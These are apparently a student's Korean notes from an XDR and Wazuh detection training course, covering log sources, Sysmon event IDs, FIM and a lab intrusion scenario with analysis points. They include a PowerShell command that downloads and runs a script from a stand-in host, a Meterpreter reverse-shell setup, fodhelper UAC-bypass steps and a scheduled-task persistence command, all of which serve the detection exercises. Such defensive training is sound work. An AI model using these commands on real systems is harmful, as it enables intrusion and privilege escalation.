커스텀룰을 만들어서 매직라인에서 발생하는 것은 모두 1000kb파일 이하만 허용


## 📋 로그 분석 기초

### 1. 로그의 4가지 핵심 구성 요소

### 2. Windows 이벤트 로그

#### 로그 저장소 구분

- Security : 인증, 권한, 감사 관련
- System : OS 수준의 서비스·드라이버 이벤트
- Application : 앱 수준 이벤트
- + 서비스별 로그 (Sysmon 등 추가 설치 시)

#### 주요 이벤트 ID
> 💡 실전 팁 : 4625 다발 → 4624 성공 패턴이 나오면 Credential Stuffing 또는 Brute Force 후 침투 의심. EDR 임계치 규칙 필수.

#### 로그 덮어쓰기 주의사항

- 스토리지 확보보다 이벤트 처리 속도(I/O, CPU)가 실질적인 병목
- 로그 수집 설정이 세밀할수록 시스템 부하 증가

→ 어떤 이벤트를 얼마나 남길지 필터링 정책이 핵심

- 로그는 삭제하면 복구 불가 → 덮어쓰기 전 정책 설계 필요

Sysmon SwiftOnSecurity 설정이 필요함

### 3. Sysmon (System Monitor)

#### 개요

- Sysinternals Suite에 포함된 선택적 설치 도구
- Windows 기본 이벤트 로그가 "굵직한 것만" 기록하는 것과 달리, 전방위적 행위 데이터 수집
- EDR 탐지 방식과 유사

#### 백신 vs Sysmon 비교

#### 해시 필드 (Hashes)

Sysmon이 프로세스 생성 시 자동으로 기록하는 세 가지 해시:
> 💡 Timestamp 변조 탐지 : 공격자가 타임스탬프를 수정하려 할 때의 행위 자체가 Sysmon 로그에 남음

#### 주요 Event ID

### 4. Linux 로그 체계

#### init vs systemd
> 💡 클라우드 경량 펌웨어·IoT 디바이스는 systemd가 너무 무거워 init 기반 CentOS 7도 현업에서 여전히 사용됨

#### 로그 수집 도구 비교
> 💡 journald + rsyslog 병행 운영 : journald만 쓰면 syslog 연동이 안 되는 레거시 시스템 대응 불가 → 두 가지를 동시에 운영하는 것이 실무 표준

#### journald 장점 정리

- 바이너리 파일 → 임의 수정 어려워 보안상 유리
- 인덱싱 → 원하는 필드만 빠른 검색 가능
- stdout 자동 기록 → 이전처럼 경로 하드코딩 불필요, 서비스 일시 중단 시에도 누락 없음

### 5. Linux 고급 감사 도구

#### auditd vs eBPF
> ⚠️ CrowdStrike 사례 : 커널 레벨에서 동작하는 EDR이 업데이트 중 실수 → 블루스크린 무한 리부팅. 커널 레벨 접근의 양날의 검을 잘 보여주는 실제 사례.
> 💡 auditd = Linux의 Sysmon : 세밀한 파일 접근, 사용자 행위, 시스템 콜까지 기록. Wazuh + auditd 조합이 홈 SOC 랩에서의 Linux 쪽 기본 스택.

### 6. Apache 웹 로그

#### 로그 파일 구조

#### 로그 로테이션

- 파일 크기가 일정 이상이 되면 자동 분할·백업
- 분석 시 .1, .2 등 순번 파일도 함께 확인 필요

#### 공격 패턴 탐지 포인트
> 💡 %2e = . URL 인코딩. 보안이 약한 서버는 디코딩 전에 필터링해서 ../ 우회가 가능함 → WAF 또는 서버 설정으로 인코딩된 경로도 필터링 필수.

### 7. 전체 흐름 요약
```plain text
Windows 환경                    Linux 환경
─────────────────               ─────────────────
Event Log (굵직한 것)           syslog / rsyslog (평문)
    +                               +
Sysmon (행위 전방위)            journald (바이너리, 빠름)
    +                               +
Wazuh Agent → Wazuh Manager     auditd / eBPF (커널 수준)
    ↓                               ↓
         Elasticsearch + Kibana Dashboard
                    ↓
              ATT&CK 매핑 / Alert
```
> 📌 보안기사 출제 포인트 : auditd vs eBPF 위치 차이, journald 바이너리 특성, Sysmon Event ID, 주요 Windows Event ID 번호와 의미는 암기 대상.


## Day3

mythos 소식 - 팔로알토가 분석 결과 발표, cv를 25개 정도 찾고 패치도 해줌

PsExec 원격접속할 때 사용가능

mtire att&ck

공격의 정보를 얻은 후 테크닉들에 대한 특징을 규정하고 커스텀용으로 룰을 만든다.

FIM 에서 파일변경을 추적하여 분석함.

> 📷 윈도우 에이전트 ossec.conf syscheck: 12시간 주기, %WINDIR%의 regedit.exe·system.ini·win.ini, SysNative/System32의 at·attrib·cacls·cmd·net 등 실행 파일, drivers\etc, wbem\WMIC.exe, WindowsPowerShell\v1.0\powershell.exe, winrm.vbs 감시, 시작 프로그램 폴더는 realtime 감시, .log/.htm/.jpg 등은 무시, HKLM\Software\Classes 등 레지스트리 키 감시.

temp파일 것은 보안특면에서 항상 주시할 필요가 있다.

32비트..

중요하지 않지만 바이패스의 요인이 될 수 있어서 봐야한다.

arch=both 는 32, 64비트 모두 보겠다.

sregex 는 usb관련

mpssvc 는 방화벽에 관한 정책리스트 microsoft protect service security

> 📷 Wazuh 대시보드 FIM Inventory(PC_Win10, 에이전트 002): Files 14개, Windows Registry 6,710개. 실습으로 만든 c:\lab\wazuh\fim\test1.txt·test2.hwp·test3.cell과 regedit.exe, hosts, wmic.exe, powershell.exe, winrm.vbs, win.ini 등 감시 대상 파일의 수정 시각·소유자·크기.

포트가 일반사용자 권한을 갖고 보통 오기 댐누에 일반 사용자의 역활박에 못해서

하나의 포터를 베놈을 이용해 권한 높게 행동할 수 있게 열어준다.

> 📷 Kali Attacker에서 msfconsole multi/handler 설정: 4444 포트 점유로 bind 실패 → `fuser -k 4444/tcp`로 정리 후 payload windows/x64/meterpreter/reverse_tcp, LHOST 192.168.44.10, LPORT 4444로 `exploit -j -z` → 192.168.44.1:3870에서 Meterpreter 세션 1 연결.

> 📷 Meterpreter 세션 연결 후 `getprivs`: 일반 사용자 권한이라 SeChangeNotify, SeIncreaseWorkingSet, SeShutdown, SeTimeZone, SeUndock 정도만 활성화돼 있다.

> 📷 `getuid` → DESKTOP-…\user, `sysinfo` → Windows 10(Build 19042) x64, ko_KR, WORKGROUP, 로그온 사용자 2명, `ipconfig` → 피해 PC 192.168.1.70.

> 📷 `shell`로 cmd 진입: 작업 디렉터리가 C:\Program Files (x86)\Hnc\HOffice9\Bin — 한글(HWP) 프로그램 프로세스에서 악성 페이로드가 실행됐음을 보여준다.

배치파일이나 스크립트를 만들어서 ping을 날려서 64는 리눅스 50은 시스코 네트워크 128?은 윈도우 운영체게를 의미해 유추가 가능하고 이를 이용해서 리소스를 집중할 것을 정할 수 있다.

auc 권한 상승 registr editor같은 것을 열떄  처음열리는 팝업

바이패스한다.

fodhelper는 윈도우에서 제공하는 기본 바이러니 파일.. 그래서 권한을 묻지않는다 그래서 같이 얹어지면 권한을 상승할 수 있다.

ㅕㅔ

pordhelp가 실행될때 uac 창은 건너뛰고  레지스터리를 보면서

mssetting를  수행하면서 실행 되고 이게 실행이 되면 같은 아랫단으로 가고 cmd를 수행하여 권한높게 고글이 권한높게 실행된이후 reverse를 통해 다시 높은 권한으로 8000포트로 실행이된다.

> 📷 권한 상승 후 두 번째 핸들러(LPORT 8000) 실행 → 192.168.44.1:16060에서 Meterpreter 세션 1 연결(fodhelper UAC 우회로 높은 무결성 수준으로 실행된 페이로드의 콜백).

세션이 꺼졌을 때 스케쥴러에 fodhelp를 넣어놓으면 다시 연결이 된다. task 스케쥴러에 실행이되도록되어있어서 고글.exe 이 실행이되고 그냥 세션만 연결하면 된다.

> 📷 상승된 세션의 `getprivs`: SeBackup, SeDebug, SeImpersonate, SeLoadDriver, SeTakeOwnership 등 관리자 권한 대거 활성화. 이어서 지속성 확보: `schtasks /create /tn "Updating" /tr "C:\Windows\System32\fodhelper.exe" /sc onlogon /RL HIGHEST` → SUCCESS(로그온할 때마다 최고 권한으로 fodhelper 실행 → 세션 재연결).

> 📷 분석 실습: Wazuh Discover에서 PC_Win10(192.168.1.70) Sysmon 이벤트 — parentImage가 Hwp.exe, image가 cmd.exe, commandLine은 Temp 폴더의 gogleDown.cmd 실행, integrityLevel Medium. 수업노트의 분석 포인트: ① 부모-자식 관계(정상은 explorer.exe → hwp.exe인데 hwp.exe가 cmd.exe·gogleUpdate.dat를 생성) ② 명령줄의 수상한 파일명 ③ 외부 IP(Kali) 4444·8080 포트 연결(destinationip/port) ④ Temp·Public 경로 파일 생성(FIM, Sysmon ID 11) ⑤ 실행 시간·맥락 타임라인.

워터링홀 공격을 위한 정보 유출 탐지

- 업데이트
- 파워쉘 명령어 확인가능
- capcha

도움말 프로그램

패스원드 평문 전송 확인

seim의 경우 정규화만해서 soa가 필요

셋중에 파일이 하나만있으면 대응이된다.

soa의 경우 api가 필요

acitve 조건 확인 룰레벨이나 에이전트 같은 것을  conf에서 본다.


## 
```plain text
------------------------------------------------------------------------------------------------------
과목명 : 정보보호제품군 실습훈련 과정 "확장형 탐지 및 대응 솔루션(XDR)"
강사명 : (생략)
수업노트 : 웹브라우저 실행 > http://10.10.1.101/20260513.txt
실습 플랫폼 : https://kisagym.net -> 이하 배정된 좌석에서 훈련에 참여합니다.
-----------------------------------------------------------------------------------------------------
로그의 4가지 핵심 구성
1. 수준(Level) : 사건의 경중
- 정보(Information)
- 경고(Warning)
- 오류(Error)
- 위험(Critical)
2. 누가/무엇이(Source)
3. 언제(Date/Time)
4. 이벤트 ID : 사건마다 부여된 고유 번호

주요 이벤트로그 이벤트 ID
1. 4624 (Security)
의미 : 로그인 성공

2. 4625 (Security)
의미 : 로그인 실패

3. 4688 (Security)
의미 : 프로세스 생성

4. 7045 (Sysyem)
의미 : 서비스 설치

윈도우키 + r  > services.msc

[79 page]
sysmon Event ID 1 탐지 실습

Event ID 1 은 프로세스가 실행될 때마다 SYSMON에 기록함

시나리오 : 공격자가 시스템에 침투하여 외부에서 악성 파일을 다운로드 받으려 한다고 가정

1. 관리자 권한으로 cmd.exe 실행

2. 아래의 명령어를 입력
powershell.exe -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://evil-site.com/malware.ps1')"

 -WindowStyle Hidden : 은닉

DownloadString : 유입

IEX (New-Object Net.WebClient) : 실행

3. 이벤트 뷰어 실행
[응용 프로그램 및 서비스 로그] - [Microsoft] - [Windows] - [Sysmon]

4. 필터에서 Event ID 1 로 확인
- 시간대 잘 확인하기

[84 page]
리눅스 로그

1. init (과거/CentOS 7 미만의 대장)
- 방식 : 직렬 방식 처리(하나씩 하나씩)
- 장점 : 단순함, 가벼움(여전히 IoT 장비나, 도커 환경에서는 이용되고 있음)
- 단점 : 부팅 속도가 매우 느림

2. systemd(현재/CentOS 7 이상의 대장)
- 방식 : 병렬 방식 처리(다 같이 시작)
- 장점 : 압도적인 속도, 부팅 속도, 강력한 관리 기능
- 단점 : 덩치가 큼(요구하는게 많음), 복잡함

[90 page]
1. auditd (전통적인 수사관)
리눅스 커널의 표준 감사 프레임워크 : 어떤 사용자가 파일을 열었는가?
동작 방식 : 커널 내부에 미리 정의된 규칙에 따라 이벤트를 기록
장점 : 거의 모든 리눅스에 기본 내장, 안정성이 뛰어남, 설정이 굉장히 단순한편
단점 : 규칙이 많아지면 안됨 > 많아지면 느려짐(고성능을 요구하는 고부하 서비스에는 부적합)
         우회가능성이 상대적으로(eBPF대비) 쉬움

2. eBPF (차세대 요원)
동작 방식 : 커널 안으로 작은 코드(샌드박스) 주입하여 실시간 데이터를 확인 및 가공
장점 : 커널 공간에서 일을 처리하므로 빠르고 효율적(auditd 대비)
         네트워크 관련 정보나 메모리 관련 정보를 세밀하게 들여다볼 수 있음
단점 : 최신 커널 버전이 필요
         복잡함....

[93 page]
Combined Log Format : 전 세계의 웹 서버들이 약속편 표준 양식

../

[99 page]
프로세스 주요 정보
 1. 프로세스 이름
svchost.exe > scvhost.exe, svch0st.exe
lsass.exe > 1, I

2. 부모-자식 관계

3. 실행 경로

4. 명령 라인

5. 리소스 사용률

6. 실행 및 종료 시간

윈도우 주요 SYSTEM Process 특징

1. system
- 모든 커널 모드 스레드의 모태가 되는 프로세스
- 특징 : 파일명이 system (PID 4 고정)
- 경로 : 경로가 없음

2. smss.exe
- 시스템 세션을 생성하고 관리하는 첫번쨰 사용자 모드 프로세스
- 윈도우 로그인 세션을 만들고 csrss.exe, wininit.exe를 실행
- 경로 : \system32\smss.exe

3. svchost.exe
- dll 형태로 실행되는 윈도우 서비스들을 담는 "바구니"
- 해커들의 최애 위장 대상
- 한개가 아니라 복수가 존재할 수 있음
- 부모 프로세스가 "반드시" services.exe 여야함

4. lsass.exe
- 반드시 하나여야 함
- 사용자 로그인, 비밀번호등 주요 크리덴셜 관련 프로세스
- 경로 : \system32\lsass.exe
- 부모 프로세스 : wininit.exe

5. explorer.exe

command:(ssh or ping)
>명령어 라인에 ssh 가 있거나 ping이 있거나

command:ssh or ping

> 명령어 라인에 ssh 가 있거나 그냥 로그 전체에 ping이 있거나
command : ssh + (전체 로그에서) ping 검색

*notepad*

132 ~141 page
SSH연결 및 해당 로그 확인 실습

[149 page]
sysmon 주요 이벤트 ID(79페이지 참조)

1. Event ID 2
- File Creation time
- 파일 생성 시간 조작 감지

2. Event ID 5
- Process Terminated
- 프로세스 종료 / 악성코드가 흔적을 지우고 사라졌는지 확인....

3. Event ID 7
- Image Loaded
- 특정 dll 파일을 로드한 내용 / 권한 상승이나, 인젝션을 탐지

1) Agent ID가 007인 에이전트의 이름과 IP는 무엇입니까?

2) 현재 수집된 로그 중에서 "위협 레벨(rule.level)"이 12이 이상인 것은 총 몇 건 입니까?
** 검색 기간은 5월10일부터로 설정

3) 출발지 IP가 192.168.1.70인 로그 중에서 로그인을 성공(Authentification Success)한 로그의 rule.id는 무엇입니까?
출발지 IP : data.srcip
rule.description

[222 page]
주요 자동 실행 등록 경로

1. 레지스트리
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

2. 시작폴더 등록
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs

regedit

[233 PAGE]
FIM(File Integrity Monitoring)
파일 무결성 모니터링의  약자로 시스템 내의 파일이 수정, 삭제, 생상되거나 권한이 변경된 경우를 모두 탐지하는 기능

- 악성 코드 감염 : 실행 파일(.exe, 바이너리 등)이 변조되었을 때
- 웹쉘 침투 : 웹 서버에 공격자가 업로드한 비정상적인 파일을 탐지했을 때
- 설정 파일 조작 : 외부인이 시스템 설정을 임의로 변경 했을 때

[234 PAGE]
FIM의 동작 원리
1. 데이터 수집
2. 변경 탐지 및 이벤트 전송
3. 분석 및 알람
4. 대응(Optional)

[254 page]
공격 시나리오
1. 악성 hwp 파일을 생성
- gogleDown.cmd와 gogleUpdate.dat : 실제 악성 행위를 수행하는 스크립트와 실행 파일
- OLE 객체 삽입 : 한글 문서 안에 표나 그림뿐 아니라, "실행이 가능한 프로그램" 끼워 넣는 기능

2. 업로드 및 리스너
- 이 악성 HWP파일을 웹 게시판에 업로드
- 리스너(Listener)를 켜고 대기

3. 누군가 해당 문서 다운로드 이후 실행
- 한글 문서 안에 포함되어있는 악성 스크립트 및 실행 파일이 실행됨

4. 리버스 커넥션(Reverse Connection)
- 피해자 > 공격자(Outbounding)
- gogleUpdate.dat 이 외부 C2 서버와 연결 시도

5. 공격자의 쉘(Shell) 획득

6. 추가 도구를 피해자 PC로 업로드
- 공격자 > 피해자
- temp, public 폴더 경로를 활용
- gogle.exe

7. UAC Bypass 등을 통해 권한 상승

8. 지속성 유지를 위한 스케쥴러 등록

[267 page]
getuid
sysinfo
ipconfig
getprivs

[276 page]
시나리오를 한번 정리해보기

1. (희생자가) resume_KimGomin.hwp 를 다운로드 받음

2. resume_KimGomin.hwp에 의해서 gogleDown.cmd 하고 gogleUpdate.dat 파일이 같이 실행됨

3. 그리고 gogleUpdate.dat 가 리버스 쉘로 C2(공격자 서버)로 연결을 함

4. gogle.exe 파일이 희생자 PC의 public 경로로 업로드 됨

5. reg add 명령을 통해 권한 상승을 위한 작업을 진행(fodhelper.exe)

6. fodhelper.exe 실행 > gogle.exe가 High Integrity Level로 함께 실행

7. 지속성 유지작업 진행(tasksch)

[278 page]
분석 위한 포인트
1. 프로세스 부모-자식 관계 분석(가장 중요)
분석 포인트
> hwp.exe가 부모 프로세스가 되어서 cmd.exe나 gogleUpdate.dat 같은 자식 프로세스를 생성함

그럼 Wazuh에서는....
data.win.eventdata.parentimage 필드가.. hwp.exe

정상적인(일반적인) 경우에는 explorer.exe  > hwp.exe

2. 명령줄(Commandline) 분석
분석 포인트
> 실행된 파일의 이름이 수상한가??
ex. gogleUpdate.dat

data.win.eventdata.commandline 

3.  네트워크 연결 및 목적지 IP 분석(C2)
분석 포인트
> 한글 프로세스나 그 자식 프로세스가 외부IP(KALI)의 특정 포트(4444,8080)로 접속을 시도한 기록이 있는가?

data.win.eventdata.destinationip // destinationport

4. 파일 생성 및 경로 분석(FIM 파일 무결성 검증 엔진)
분석 포인트
> temp, public 같은 경로에 resume... gogleUpdate.dat... 생성이 되었는가?

FIM 탭에서 Sysmon ID 11(FileCreate)

5. 실행 시간 및 맥락 분석(TimeLine)
분석 포인트
> 문서를 연 시간(hwp.exe)과 관련이 있는 (악성)파일들의 실행 및 네트워크 연결 시간이 짧은 간격으로 이루어졌는가?

timelin view를 통해 이벤트 발생 순서를 재구성 할 수 있음

6. 레지스트리
reg add 등의 명령으로 특정 값(value)를 추가한 행위 등..

data.win.eventdata.eventType    

7. 무결성 검증(Sysmon ID 1)
Sysmon ID 1 의 "Integrity Level" 항목 확인

> high 

8. 자동 실행 등록(tasksch)
Windows Event ID 4698 // Sysmon ID 1

data.win.eventdata.commandline
schtaks /create....
권한 상승(fodhelper.exe) 분석 관련
1. 레지스트리 수정(sysmon ID 13)
- 일반 사용자가 건드릴 이유가 없는 ms-settings 관련 레지스트리 값이 갑자기 왜 바뀌었는가?
- data.win.eventdata.targetObject에 ms-settings\shell\open\command 문구가 포함된 로그를 조사

2. 부모-자식 관계 확인(sysmon ID 1)
- fodhelper가 실행된 직후, 자식 프로세스로 악성코드(gogle.exe)가 태어났는가?
- data.win.eventdata.parentimage 
- parentImage가 fodhelper.exe인 로그의 integrityLevel이 High 인지 확인

3. 권한 등급 확인(Integrity Level)
- 아까는 medium(또는 다른) 이었던 해커의 쉘이 high로 바뀐 부분

rule.id 554 = FIM 기능에 의한 탐지고, "시스템에 새로운 파일이 추가됨"

rule 92213 = Temp 폴더 내 실행 파일 생성을 탐지 했을 때 발생하는 위협 알림

rule 92052 = 프로세스의 "부모-자식 관계"가 비정상적일 때 발생하는 위협 알림

rule 92211 = 윈도우 기본 도구인 rundll32.exe가 실행파일(.exe, .dll 등)을 생성할 때 발생하는 위협 알림

rule 92305 = 일반적인 데이터가 들어가야 할 자리에 cmd.exe나 powershell.exe 같은 명령 인터프리터가 주입되었음을 알리는 위협 알림 

308 page]
Active Response 동작 흐름
1. 이벤트 발생
- 사용자 PC에서 보안 이벤트 발생

2. 로그 수집
- Agent 수집 이후 > Manager(서버)로 전송

3. 이벤트 분석
- 디코더, 룰, MITRE...

4. Alert 생성
- 분석 결과 특정 조건에 맞는 rule이 탐지되면 정책에 따라 Alert 생성

5. Active-Response 조건 확인
- ossec.conf 설정 기반으로 확인

6. 대응 스크립트 실행
- 조건 충족 시, 자동 대응 수행

7. 관련 기록 저장
- 대응 내용 저장
[308 page]
Active Response 동작 흐름
1. 이벤트 발생
- 사용자 PC에서 보안 이벤트 발생

2. 로그 수집
- Agent 수집 이후 > Manager(서버)로 전송

3. 이벤트 분석
- 디코더, 룰, MITRE...

4. Alert 생성
- 분석 결과 특정 조건에 맞는 rule이 탐지되면 정책에 따라 Alert 생성

5. Active-Response 조건 확인
- ossec.conf 설정 기반으로 확인

6. 대응 스크립트 실행
- 조건 충족 시, 자동 대응 수행

7. 관련 기록 저장
- 대응 내용 저장

```
